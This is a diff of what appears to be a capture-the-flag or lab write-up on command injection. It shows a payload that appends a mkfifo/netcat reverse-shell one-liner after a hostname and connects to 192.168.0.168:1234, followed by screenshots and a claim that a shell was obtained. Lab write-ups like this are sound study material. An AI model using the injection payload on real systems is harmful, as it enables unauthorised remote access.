@@ -48,6 +48,20 @@ Ensure you set up a netcat listener
 
 So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6f015db-919f-44b6-82ef-1c31a1c74737)
+
+Checking my netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26861a22-4676-4f97-af6f-8a515b1e3055)
+
+I was able to get a reverse shell.
+
+Well, that's all for this challenge since we've successfully exploited the vulnerability there. 
+
+--------------------------
+
+# A2
+<hr>
 
 
 
